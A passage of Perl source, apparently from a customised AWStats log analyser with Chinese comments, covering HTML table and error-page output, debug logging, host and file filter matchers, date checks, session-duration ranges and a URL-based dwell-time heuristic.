		my $class     = shift;

		# 翻译标题
		$title = _t($title);

		# 根据 $class 设置完整的 class 字符串
		my $table_class = "aws-data-table";
		if ($class eq 'hosts' || $class eq 'unknownip') {
				$table_class = "aws-data-table ip-table";
		} elsif ($class eq 'robots') {
				$table_class = "aws-data-table robot-table";
		}

	# Call to plugins' function TabHeadHTML
	my $extra_head_html = '';
	foreach my $pluginname ( keys %{ $PluginsLoaded{'TabHeadHTML'} } ) {
		my $function = "TabHeadHTML_$pluginname";
		$extra_head_html .= &$function($title);
	}

	if ( $width == 70 && $QueryString =~ /buildpdf/i ) {
		print "<table class=\"aws-chart\" border=\"0\" cellpadding=\"2\" cellspacing=\"0\" width=\"800\">";
	} else {
		print "<table class=\"aws-chart\" border=\"0\" cellpadding=\"2\" cellspacing=\"0\" width=\"100%\">";
	}

	if ($tooltipnb) {
		print "<tr><td class=\"aws-title\" width=\"$width%\""
		  . Tooltip( $tooltipnb, $tooltipnb )
		  . ">$title "
		  . $extra_head_html . "</td>\n";
	} else {
		print "<tr><td class=\"aws-title\" width=\"$width%\">$title "
		  . $extra_head_html . "</td>\n";
	}
	print "<td class=\"aws-whitespace\">&nbsp;</td>\n</tr>\n";
	print "<tr><td colspan=\"2\">";
		if ( $width == 70 && $QueryString =~ /buildpdf/i ) {
				print "<table class=\"$table_class\" border=\"1\" cellpadding=\"2\" cellspacing=\"0\" width=\"796\">";
		} else {
				print "<table class=\"$table_class\" border=\"1\" cellpadding=\"2\" cellspacing=\"0\" width=\"100%\">";
		}
}

#------------------------------------------------------------------------------
# Function:		Print on stdout tab ender of a chart
# Parameters:	None
# Input:		None
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub tab_end {
	my $string = shift;
	print "</table></td></tr></table>";
	if ($string) {
		# 翻译字符串
		$string = _t($string);
		print "<div class=\"aws-note\">$string</div>";
	}
	print "<br>\n";
}

#------------------------------------------------------------------------------
# Function:		Write error message and exit
# Parameters:	$message $secondmessage $thirdmessage $donotshowsetupinfo
# Input:		$HeaderHTTPSent $HeaderHTMLSent %HTMLOutput $LogSeparator $LogFormat
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub error {
	my $message = shift || '';
	if ( scalar keys %HTMLOutput ) {
		$message =~ s/\</&lt;/g;
		$message =~ s/\>/&gt;/g;
	}
	&Read_Language_Data($Lang); 
	my $secondmessage      = shift || '';
	my $thirdmessage       = shift || '';
	my $donotshowsetupinfo = shift || 0;
	my $dir = $PageDir ? 'rtl' : 'ltr';
	if ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) { http_head(); }
	if ( !$HeaderHTMLSent && scalar keys %HTMLOutput )   {
		print "<!DOCTYPE html>\n";
		print "<html lang=\"" . _t($Lang) . "\" dir=\"$dir\">\n";
		print "<head>\n";
		print "<meta charset=\"utf-8\">\n";
		print "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n";
		print "<meta name=\"generator\" content=\"AWStats $VERSION\">\n";
		print "<link rel=\"icon\" href='data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\"><text x=\"50\" y=\"55\" font-size=\"50\" text-anchor=\"middle\">📊</text></svg>'>\n";
		print "<link rel=\"icon\" type=\"image/svg+xml\" sizes=\"16x16\" href='data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 100 100\"><text x=\"50\" y=\"55\" font-size=\"50\" text-anchor=\"middle\">📊</text></svg>'>\n";
		print "<link rel=\"apple-touch-icon\" sizes=\"180x180\" href='data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"180\" height=\"180\" viewBox=\"0 0 100 100\"><text x=\"50\" y=\"55\" font-size=\"50\" text-anchor=\"middle\">📊</text></svg>'>\n";
		print "<link rel=\"icon\" sizes=\"192x192\" href='data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"192\" height=\"192\" viewBox=\"0 0 100 100\"><text x=\"50\" y=\"55\" font-size=\"50\" text-anchor=\"middle\">📊</text></svg>'>\n";
		print "<link rel=\"icon\" sizes=\"512x512\" href='data:image/svg+xml,<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"512\" height=\"512\" viewBox=\"0 0 100 100\"><text x=\"50\" y=\"55\" font-size=\"50\" text-anchor=\"middle\">📊</text></svg>'>\n";
		print "<link rel=\"manifest\" href=\"$DirIcons/os/site.webmanifest\">\n";
		print get_modern_css($dir ? 'rtl' : 'ltr');
		print "</head><body><div class=\"aws-container\">\n";
		$HeaderHTMLSent = 1;
	}
	
	if ($Debug) { debug( "$message $secondmessage $thirdmessage", 1 ); }
	
	my $tagbold     = '<strong>';
	my $tagunbold   = '</strong>';
	my $tagbr       = '<br>\n';
	my $tagfontred  = '<span class="error-text">';
	my $tagfontgrey = '<span class="info-text">';
	my $tagunfont   = '</span>';
	
	if ( !$ErrorMessages && $message =~ /^Format error$/i ) {

		# Files seems to have bad format
		if ( scalar keys %HTMLOutput )   { print "<div class=\"error-card\">"; }
		if ( $message !~ $LogSeparator ) {

			# Bad LogSeparator parameter
			print $tagfontred . _t("AWStats did not found the") . " ${tagbold}LogSeparator${tagunbold} " . _t("in your log records.") . "${tagbr}${tagunfont}\n";
		}
		else {

			# Bad LogFormat parameter
			print "<p>" . _t("AWStats did not find any valid log lines that match your") . " ${tagbold}LogFormat${tagunbold} " . _t("parameter, in the") . " ${NbOfLinesForCorruptedLog}" . _t("th first non commented lines read of your log.") . "</p>";
			print $tagfontred . "<p>" . _t("Your log file") . " ${tagbold}$thirdmessage${tagunbold} " . _t("must have a bad format or") . " ${tagbold}LogFormat${tagunbold} " . _t("parameter setup does not match this format.") . "</p>${tagbr}${tagunfont}\n";
			print "<p>" . _t("Your AWStats") . " ${tagbold}LogFormat${tagunbold} " . _t("parameter is:") . "</p>";
			print "<pre class=\"code-block\">$LogFormat</pre>";
			print "<p>" . _t("This means each line in your web server log file need to have:") . "</p>";
			
			if ( $LogFormat == 1 ) {
				print "<p><strong>" . _t("combined log format") . "</strong> " . _t("like this:") . "</p>";
				print( scalar keys %HTMLOutput ? "<div class=\"code-block\">" : "" );
				print "111.22.33.44 - - [10/Jan/2001:02:14:14 +0200] \"GET / HTTP/1.1\" 200 1234 \"http://www.fromserver.com/from.htm\" \"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\"\n";
				print( scalar keys %HTMLOutput ? "</div>" : "" );
			}
			if ( $LogFormat == 2 ) {
				print "<p><strong>" . _t("MSIE Extended W3C log format") . "</strong> " . _t("like this:") . "</p>";
				print( scalar keys %HTMLOutput ? "<div class=\"code-block\">" : "" );
				print "date time c-ip c-username cs-method cs-uri-sterm sc-status sc-bytes cs-version cs(User-Agent) cs(Referer)\n";
				print( scalar keys %HTMLOutput ? "</div>" : "" );
			}
			if ( $LogFormat == 3 ) {
				print "<p><strong>" . _t("WebStar native log format") . "</strong></p>";
			}
			if ( $LogFormat == 4 ) {
				print "<p><strong>" . _t("common log format") . "</strong> " . _t("like this:") . "</p>";
				print( scalar keys %HTMLOutput ? "<div class=\"code-block\">" : "" );
				print "111.22.33.44 - - [10/Jan/2001:02:14:14 +0200] \"GET / HTTP/1.1\" 200 1234\n";
				print( scalar keys %HTMLOutput ? "</div>" : "" );
			}
			if ( $LogFormat == 6 ) {
				print "<p><strong>" . _t("Lotus Notes/Lotus Domino") . "</strong> " . _t("like this:") . "</p>";
				print( scalar keys %HTMLOutput ? "<div class=\"code-block\">" : "" );
				print "111.22.33.44 - Firstname Middlename Lastname [10/Jan/2001:02:14:14 +0200] \"GET / HTTP/1.1\" 200 1234 \"http://www.fromserver.com/from.htm\" \"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\"\n";
				print( scalar keys %HTMLOutput ? "</div>" : "" );
			}
			if ( $LogFormat !~ /^[1-6]$/ ) {
				print "<p>" . _t("the following personalized log format:") . "</p>";
				print( scalar keys %HTMLOutput ? "<div class=\"code-block\">" : "" );
				print "$LogFormat\n";
				print( scalar keys %HTMLOutput ? "</div>" : "" );
			}
			print "<p>" . _t("And this is an example of records AWStats found in your log file (the record number") . " $NbOfLinesForCorruptedLog " . _t("in your log):") . "</p>";
			print( scalar keys %HTMLOutput ? "<div class=\"code-block\">" : "" );
			print "$secondmessage";
			print( scalar keys %HTMLOutput ? "</div>" : "" );
			print "\n";
		}
	}
	else {
		print "<div class=\"error-card\" style=\"text-align: center;\">";
		print "<h3>" . _t("Error") . "</h3>";
		print "<div style=\"font-size: 100px; font-weight: bold; line-height: 1; margin-bottom: 20px;\">";
		print "<span style=\"color: var(--error-color);\">5</span>";
		print "<span style=\"color: var(--warning-color);\">0</span>";
		print "<span style=\"color: var(--error-color);\">0</span>";
		print "</div>";
		print "<p style=\"white-space: pre-wrap; text-align: left; display: inline-block; max-width: 90%; margin: 0 auto;\">" . ($ErrorMessages ? $ErrorMessages : _t($message)) . "</p>";
		print "</div>";
	}
	
	if ( !$ErrorMessages && !$donotshowsetupinfo ) {
		print "<div class=\"help-card\">";
		print "<h4>" . _t("Troubleshooting") . "</h4>";
		
		if ( $message =~ /Couldn.t open config file/i ) {
			my $dir = $DIR;
			if ( $dir =~ /^\./ ) { $dir .= '/../..'; }
			else { $dir =~ s/[\\\/]?wwwroot[\/\\]cgi-bin[\\\/]?//; }
			print "<p>";
			if ( $ENV{'GATEWAY_INTERFACE'} ) {
				print "- <strong>" . _t("Did you use the correct URL?") . "</strong><br>";
				print _t("Example:") . " http://localhost/awstats/awstats.pl?config=mysite<br>";
				print _t("Example:") . " http://127.0.0.1/cgi-bin/awstats.pl?config=mysite<br>";
			}
			else {
				print "- <strong>" . _t("Did you use correct config parameter?") . "</strong><br>";
				print _t("Example: If your config file is awstats.mysite.conf, use -config=mysite") . "<br>";
			}
			print "- <strong>" . _t("Did you create your config file 'awstats.$SiteConfig.conf'?") . "</strong><br>";
			print _t("If not, you can run \"awstats_configure.pl\" from command line, or create it manually.") . "<br>";
			print "</p>";
		}
		else {
			print "<p><strong>" . _t("Setup") . " ("
			  . ( $FileConfig ? "'" . $FileConfig . "'" : "Config" )
			  . ") " . _t("file, web server or permissions may be wrong.") . "</strong></p>";
		}
		print "<p>" . _t("Check config file, permissions and AWStats documentation (in 'docs' directory).") . "</p>";
		print "</div>\n";
	}

	# Remove lock if not a lock message
	if ( $EnableLockForUpdate && $message !~ /lock file/ ) { &Lock_Update(0); }
	
	if ( scalar keys %HTMLOutput ) {
		print "</div>\n";
		print get_theme_script();
		print "</body>\n</html>\n";
	}
	exit 1;
}
#------------------------------------------------------------------------------
# Function:		Write a warning message
# Parameters:	$message
# Input:		$HeaderHTTPSent $HeaderHTMLSent $WarningMessage %HTMLOutput
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub warning {
	my $messagestring = shift;

	if ($Debug) { debug( "$messagestring", 1 ); }
	
	$messagestring = _t($messagestring);
	
	if ($WarningMessages) {
		if ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) { http_head(); }
		if ( !$HeaderHTMLSent ) { html_head(); }
		if ( scalar keys %HTMLOutput ) {
			$messagestring =~ s,\n,<br>,g;
			print "<div class=\"warning-message\">$messagestring</div>";
		} else {
			print "Warning: $messagestring\n";
		}
	}
}

#------------------------------------------------------------------------------
# Function:     Output debug message to STDERR or debug.log
# Description:  - Writes debug info when $Debug >= $level or $DEBUGFORCED >= $level
#               - Does NOT exit the program (contrary to legacy comment)
#               - Automatically sets $Debug=2 when $DebugMessages is enabled
# Parameters:   $string - debug message
#               $level  - verbosity threshold (default 1)
# Input:        $Debug, $DEBUGFORCED, %HTMLOutput
# Output:       Debug text to STDERR (CGI mode) or debug.log (CLI mode with $DEBUGFORCED)
# Return:       None
#------------------------------------------------------------------------------
sub debug {
	my $level = $_[1] || 1;

	# Auto-set Debug level when DebugMessages is enabled
	# Default to level 2 when debug is on
	if ($DebugMessages && !defined $Debug) {
		$Debug = 2;
	}
	$Debug = 0 unless defined $Debug;

	if ( !$HeaderHTTPSent && $ENV{'GATEWAY_INTERFACE'} ) {
		http_head();
	}    # To send the HTTP header and see debug
	
	if ( $level <= $DEBUGFORCED ) {
		my $debugstring = $_[0];
		if ( !$DebugResetDone ) {
			open( DEBUGFORCEDFILE, "<debug.log" );
			close DEBUGFORCEDFILE;
			chmod 0666, "debug.log";
			$DebugResetDone = 1;
		}
		open( DEBUGFORCEDFILE, ">>debug.log" );
		print DEBUGFORCEDFILE localtime(time)
		  . " - $$ - DEBUG $level - $debugstring\n";
		close DEBUGFORCEDFILE;
	}
	
	if ( $DebugMessages && $level <= $Debug ) {
		my $debugstring = $_[0];
		if ( scalar keys %HTMLOutput ) {
			$debugstring =~ s/^ /&nbsp;&nbsp; /;
			$debugstring .= "<br>";
		}
		print localtime(time) . " - DEBUG $level - $debugstring\n";
	}
}

#------------------------------------------------------------------------------
# Function:     Optimize an array of precompiled regex by removing duplicate entries
# Parameters:	@Array notcasesensitive=0|1
# Input:        None
# Output:		None
# Return:		None
#------------------------------------------------------------------------------
sub OptimizeArray {
	my ( $array, $notcasesensitive ) = @_;
	my %seen;

	if ($notcasesensitive) {

		# Case insensitive
		my $uncompiled_regex;
		return map {
			$uncompiled_regex = UnCompileRegex($_);
			!$seen{ lc $uncompiled_regex }++ ? qr/$uncompiled_regex/i : ()
		} @$array;
	}

	# Case sensitive
	return map { !$seen{$_}++ ? $_ : () } @$array;
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipDNSLookupFor array
# Parameters:	ip @SkipDNSLookupFor (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipDNSLookup {
	foreach (@SkipDNSLookupFor) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @SkipDNSLookupFor
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipHosts array
# Parameters:	host @SkipHosts (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipHost {
	foreach (@SkipHosts) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @SkipHosts
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipReferrers array
# Parameters:	host @SkipReferrers (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipReferrer {
	foreach (@SkipReferrers) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @SkipReferrers
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipUserAgents array
# Parameters:	useragent @SkipUserAgents (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipUserAgent {
	foreach (@SkipUserAgents) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @SkipUserAgent
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in SkipFiles array
# Parameters:	url @SkipFiles (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub SkipFile {
	foreach (@SkipFiles) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @SkipFiles
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in OnlyHosts array
# Parameters:	host @OnlyHosts (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub OnlyHost {
	foreach (@OnlyHosts) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @OnlyHosts
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in OnlyUsers array
# Parameters:	host @OnlyUsers (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub OnlyUser {
	foreach (@OnlyUsers) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @OnlyUsers
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in OnlyUserAgents array
# Parameters:	useragent @OnlyUserAgents (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub OnlyUserAgent {
	foreach (@OnlyUserAgents) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @OnlyUserAgents
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in NotPageFiles array
# Parameters:	url @NotPageFiles (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub NotPageFile {
	foreach (@NotPageFiles) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @NotPageFiles
}

#------------------------------------------------------------------------------
# Function:     Check if parameter is in OnlyFiles array
# Parameters:	url @OnlyFiles (a NOT case sensitive precompiled regex array)
# Return:		0 Not found, 1 Found
#------------------------------------------------------------------------------
sub OnlyFile {
	foreach (@OnlyFiles) {
		if ( $_[0] =~ /$_/ ) { return 1; }
	}
	0;    # Not in @OnlyFiles
}

#------------------------------------------------------------------------------
# Function:     Return day of week of a day
# Parameters:	$day $month $year
# Return:		0-6
#------------------------------------------------------------------------------
sub DayOfWeek {
	my ( $day, $month, $year ) = @_;
	if ($Debug) { debug( "DayOfWeek for $day $month $year", 4 ); }
	if ( $month < 3 ) { $month += 10; $year--; }
	else { $month -= 2; }
	my $cent = sprintf( "%1i", ( $year / 100 ) );
	my $y    = ( $year % 100 );
	my $dw   = (
		sprintf( "%1i", ( 2.6 * $month ) - 0.2 ) + $day + $y +
		  sprintf( "%1i", ( $y / 4 ) ) + sprintf( "%1i", ( $cent / 4 ) ) -
		  ( 2 * $cent ) ) % 7;
	$dw += 7 if ( $dw < 0 );
	if ($Debug) { debug( " is $dw", 4 ); }
	return $dw;
}

#------------------------------------------------------------------------------
# Function:     Return 1 if a date exists
# Parameters:	$day $month $year
# Return:		1 if date exists else 0
#------------------------------------------------------------------------------
sub DateIsValid {
	my ( $day, $month, $year ) = @_;
	if ($Debug) { debug( "DateIsValid for $day $month $year", 4 ); }
	if ( $day < 1 )  { return 0; }
	if ( $day > 31 ) { return 0; }
	if ( $month == 4 || $month == 6 || $month == 9 || $month == 11 ) {
		if ( $day > 30 ) { return 0; }
	}
	elsif ( $month == 2 ) {
		my $leapyear = ( $year % 4 == 0 ? 1 : 0 );   # A leap year every 4 years
		if ( $year % 100 == 0 && $year % 400 != 0 ) {
			$leapyear = 0;
		}    # Except if year is 100x and not 400x
		if ( $day > ( 28 + $leapyear ) ) { return 0; }
	}
	return 1;
}

#------------------------------------------------------------------------------
# Function:     Check if a year is a leap year in Gregorian calendar
# Parameters:   $year
# Return:       1 if leap year, 0 otherwise
#------------------------------------------------------------------------------
sub is_leap_year {
	my $year = shift;
	return ($year % 4 == 0 && $year % 100 != 0) || ($year % 400 == 0);
}

#------------------------------------------------------------------------------
# Function:     Check if a date is valid for the current calendar
# Parameters:   $year, $month, $day, $max_days
# Return:       1 if valid, 0 otherwise
#------------------------------------------------------------------------------
sub is_valid_calendar_day {
	my ($year, $month, $day, $max_days) = @_;
	return 0 if $day > $max_days;
	return DateIsValid($day, $month, $year);
}

#------------------------------------------------------------------------------
# Function:     Return string of visit duration
# Parameters:	$starttime $endtime
# Input:        None
# Output:		None
# Return:		A string from $SessionsRange[0..6] that identify the visit duration range
#------------------------------------------------------------------------------
sub GetSessionRange {
	my $param1 = shift;
	my $param2 = shift;
	my $url = shift || '';

	# 1. 单页访问
	if ($param1 == $param2) {
		return _get_session_range_by_duration(estimate_single_page_duration($url));
	}

	my $starttime;
	my $endtime;

	eval {
		if ($param1 =~ /$regdate/o) { 
			$starttime = Time::Local::timelocal($6, $5, $4, $3, $2 - 1, $1); 
		}
		if ($param2 =~ /$regdate/o) { 
			$endtime = Time::Local::timelocal($6, $5, $4, $3, $2 - 1, $1); 
		}
	};

	if (!$starttime || !$endtime) {
		return undef;
	}

	my $delay = $endtime - $starttime;

	if ($delay <= 0) {
		return _get_session_range_by_duration(estimate_single_page_duration($url));
	}
	
	if ($delay > 86400) {
		$delay = 86400;
	}

	return _get_session_range_by_duration($delay);
}
#------------------------------------------------------------------------------
# Function:     Map session duration in seconds to a predefined range string
# Parameters:   $delay - duration in seconds (may be zero, negative, or undef)
# Return:       Range string from @SessionsRange (e.g., '0s-30s', '15min-30min', '24h+')
#               Returns undef if $delay is undef or invalid
# Note:         - 0 or negative values are mapped to the minimum range '0s-30s'
#               - Values >86400 are capped at 86400 (24h+ range)
#               - Ranges defined in @SessionsRange must stay in sync with this function
#------------------------------------------------------------------------------
sub _get_session_range_by_duration {
	my $delay = shift;
	
	if ($delay <= 30)      { return $SessionsRange[0]; }
	if ($delay <= 60)      { return $SessionsRange[1]; }
	if ($delay <= 120)     { return $SessionsRange[2]; }
	if ($delay <= 180)     { return $SessionsRange[3]; }
	if ($delay <= 300)     { return $SessionsRange[4]; }
	if ($delay <= 600)     { return $SessionsRange[5]; }
	if ($delay <= 900)     { return $SessionsRange[6]; }
	if ($delay <= 1800)    { return $SessionsRange[7]; } 
	if ($delay <= 2700)    { return $SessionsRange[8]; }
	if ($delay <= 3600)    { return $SessionsRange[9]; }
	if ($delay <= 5400)    { return $SessionsRange[10]; }
	if ($delay <= 7200)    { return $SessionsRange[11]; }
	if ($delay <= 10800)   { return $SessionsRange[12]; }
	if ($delay <= 14400)   { return $SessionsRange[13]; }
	if ($delay <= 18000)   { return $SessionsRange[14]; }
	if ($delay <= 21600)   { return $SessionsRange[15]; }
	if ($delay <= 28800)   { return $SessionsRange[16]; }
	if ($delay <= 36000)   { return $SessionsRange[17]; }
	if ($delay <= 43200)   { return $SessionsRange[18]; }
	if ($delay <= 64800)   { return $SessionsRange[19]; }
	if ($delay <= 86400)   { return $SessionsRange[20]; }
	return $SessionsRange[21];
}

#------------------------------------------------------------------------------
# Function:     Estimate page dwell time for single-page visits
# Description:  Used when a session has only one page view (no second timestamp).
#               Applies 23 URL pattern rules (static assets, media, API, login,
#               search, video, audio, reading, e-commerce, etc.) with adjustments
#               for dynamic pages, query params, and mobile User-Agent.
#               Returns 2-10800 seconds, default 15s.
# Parameters:   $url - Full request URL
# Input:        $UserAgent (global)
# Return:       Estimated dwell time in seconds
#------------------------------------------------------------------------------
sub estimate_single_page_duration {
	my $url = shift || '';
	
	# 解码 URL（处理 %20 等编码）
	$url =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
	$url = lc($url);
	
	# 提取路径（去除查询参数）
	my $path = $url;
	$path =~ s/\?.*$//;
	
	my $duration = 15;  # 默认 15 秒

	# 1. 静态资源（最短停留）
	if ( $path =~ m{\.(jpg|jpeg|png|gif|webp|svg|bmp|ico|css|js|woff|woff2|ttf|eot|map)$} ) {
		$duration = 2;
	}
	# 2. 媒体资源
	elsif ( $path =~ m{\.(mp4|webm|mkv|avi|mov|flv|mp3|m4a|ogg|wav|flac|aac)$} ) {
		$duration = 30;
	}
	# 3. 下载文件
	elsif ( $path =~ m{\.(zip|tar|gz|bz2|xz|7z|rar|exe|msi|dmg|pkg|deb|rpm|apk|ipa|hap|pdf|epub|mobi|azw3|torrent)$} ) {
		$duration = 30;
	}
	# 4. API 调用
	elsif ( $path =~ m{/api/|/rest/|/graphql/|/rpc/|/v[0-9]+/} ) {
		$duration = 3;
	}
	# 5. 登录/注册页面
	elsif ( $path =~ m{/login/|/signin/|/signup/|/register/|/auth/|/oauth/|/logout/|/signout/} ) {
		$duration = 60;
	}
	# 6. 搜索页面
	elsif ( $path =~ m{/search/|/find/|/explore/|/discover/} || $url =~ /[?&]s=|q=|\?q=|keyword=|query=/ ) {
		$duration = 25;
	}
	# 7. 短视频/Reels/Shorts
	elsif ( $path =~ m{/shorts/|/reel/|/short/|/tiktok/|/snapchat/|/instagram/reel/} ) {
		$duration = 300;
	}
	# 8. 直播页面
	elsif ( $path =~ m{/live/|/stream/|/room/|/broadcast/|/twitch/|/youtube/live/} ) {
		$duration = 1800;
	}
	# 9. 长视频/电影/剧集
	elsif ( $path =~ m{/movie/|/film/|/cinema/|/tv/|/episode/|/drama/|/series/|/vod/|/video/|/watch/} ) {
		$duration = 2700;
	}
	# 10. 音频/播客
	elsif ( $path =~ m{/podcast/|/audio/|/music/|/song/|/track/|/album/} ) {
		$duration = 1800;
	}
	# 11. 课程/教程
	elsif ( $path =~ m{/course/|/lesson/|/tutorial/|/guide/|/learn/|/training/|/education/} ) {
		$duration = 1800;
	}
	# 12. 小说/阅读
	elsif ( $path =~ m{/novel/|/book/|/chapter/|/read/|/story/|/fiction/|/comic/|/manga/|/light-novel/} ) {
		$duration = 1800;
	}
	# 13. 文章/博客/新闻
	elsif ( $path =~ m{/article/|/blog/|/post/|/news/|/entry/|/p/|/story/|/feature/} ) {
		my $depth = ($path =~ tr/\///);
		if ($depth > 4) {
			$duration = 180;
		} elsif ($depth > 2) {
			$duration = 120;
		} else {
			$duration = 90;
		}
	}
	# 14. 文档/帮助
	elsif ( $path =~ m{/docs/|/documentation/|/help/|/faq/|/wiki/|/manual/|/guide/|/support/} ) {
		$duration = 120;
	}
	# 15. 论坛/问答
	elsif ( $path =~ m{/forum/|/discuss/|/question/|/qa/|/community/|/thread/|/topic/|/answer/} ) {
		$duration = 300;
	}
	# 16. 电商/商品页
	elsif ( $path =~ m{/product/|/item/|/goods/|/shop/|/store/|/cart/|/checkout/|/order/} ) {
		$duration = 75;
	}
	# 17. 个人中心/仪表盘
	elsif ( $path =~ m{/dashboard/|/account/|/profile/|/settings/|/user/|/member/|/my-|/me/} ) {
		$duration = 180;
	}
	# 18. 代码仓库
	elsif ( $path =~ m{/github/|/git/|/repo/|/code/|/api-docs/|/swagger/|/developer/} ) {
		$duration = 300;
	}
	# 19. 招聘/求职
	elsif ( $path =~ m{/job/|/career/|/position/|/recruit/|/employment/} ) {
		$duration = 180;
	}
	# 20. 活动/事件
	elsif ( $path =~ m{/event/|/conference/|/meetup/|/webinar/|/workshop/} ) {
		$duration = 1800;
	}
	# 21. 首页/入口
	elsif ( $path =~ m{/$|index|home|main|landing|default|start} ) {
		$duration = 45;
	}
	# 22. 默认：根据路径深度估算
	else {
		my $depth = ($path =~ tr/\///);
		if ($depth > 5) {
			$duration = 45;
		} elsif ($depth > 3) {
			$duration = 30;
		} elsif ($depth > 1) {
			$duration = 20;
		} else {
			$duration = 15;
		}
	}
	
	# 动态页面加权
	if ( $path =~ m{\.html?$|\.htm$|\.php$|\.jsp$|\.aspx$|\.do$|\.cgi$|\.pl$} ) {
		$duration = int($duration * 1.2);
	}
	
	# 包含查询参数的页面
	if ( $url =~ /\?/ && $url !~ m{\.(jpg|png|gif|css|js)$} ) {
		$duration = int($duration * 1.1);
	}
	
	# 移动端加权
	if ( $UserAgent && ($UserAgent =~ /Mobile|Android|iPhone|iPad|iPod/i) ) {
		$duration = int($duration * 1.15);
	}
	$duration = 10800 if $duration > 10800;
	$duration = 2 if $duration < 2;
	
	if ($Debug) {
		debug("Single page duration estimate: $url → {$duration}s", 3);
	}
	
	return $duration;
}

#------------------------------------------------------------------------------
# Function:     Get file extension from URL path
# Description:  - Matches extension via $regext (e.g., "\.(\w+)$")
#               - Directory requests (trailing slash) fall back to $DefaultFile[0]
#               - Returns extension only if $LevelForFileTypesDetection >= 2
#                 OR extension is known in %MimeHashLib (otherwise 'Unknown')
# Parameters:   $regext, $urlwithnoquery
# Input:        $LevelForFileTypesDetection, %MimeHashLib, @DefaultFile
# Return:       Lowercase extension or "Unknown"
#------------------------------------------------------------------------------
sub Get_Extension{
	my $extension;
	my $regext = shift;
	my $urlwithnoquery = shift;

	if ( $urlwithnoquery =~ /$regext/o ) {
		$extension = ( $LevelForFileTypesDetection >= 2 || $MimeHashLib{$1} )
					 ? lc($1)
					 : 'Unknown';
	}
	elsif ( $urlwithnoquery =~ /[\\\/]$/ && $DefaultFile[0] =~ /\.(\w+)$/ ) {
		$extension = ( $LevelForFileTypesDetection >= 2 || $MimeHashLib{$1} )
					 ? lc($1)
					 : 'Unknown';
	}
	else {
		$extension = 'Unknown';
	}    
	return $extension;
}

#------------------------------------------------------------------------------
# Function:     Extract base filename from a URL or file path
# Parameters:   $path - Full URL or filesystem path
# Input:        None
# Output:       None
# Return:       Filename after the last '/' or '\' character.
#               Returns the entire string if no separator is found.
#------------------------------------------------------------------------------
sub Get_Filename{
	my $path = shift;
	
	my $idx = rindex($path, "/");
	if ($idx < 0) {
		$idx = rindex($path, "\\");
	}
	
	return ($idx >= 0) ? substr($path, $idx + 1) : $path;
}

#------------------------------------------------------------------------------
# Function:     Map payload size (bytes) to bandwidth range string
# Parameters:   $payload - Size in bytes
# Input:        @PayloadRange - Predefined list: '0-44', '44-100', '100-500',
#               '500-1K', '1K-2K', '2K-5K', '5K+'
# Return:       Range string (e.g., '0-44', '5K+')
# Note:         Zero/negative values map to '0-44'; values >5120 map to '5K+'
#------------------------------------------------------------------------------
sub GetBandwidthRange {
	my $payload = shift;
	if ($Debug) { debug("GetBandwidthRange payload=$payload bytes", 4); }
	
	if ($payload <= 44)      { return $PayloadRange[0]; }
	if ($payload <= 100)     { return $PayloadRange[1]; }
	if ($payload <= 500)     { return $PayloadRange[2]; }
	if ($payload <= 1024)    { return $PayloadRange[3]; }
	if ($payload <= 2048)    { return $PayloadRange[4]; }
	if ($payload <= 5120)    { return $PayloadRange[5]; }
	return $PayloadRange[6];
}

#------------------------------------------------------------------------------
# Function:     Map request time (ms) to a predefined range string
# Parameters:   $rqtime - Processing time in milliseconds
# Input:        @TimeRange - Predefined list: '0-44', '44-100', '100-500',
#               '500-1K', '1K-2K', '2K-5K', '5K+'
# Return:       Range string (e.g., '0-44', '5K+')
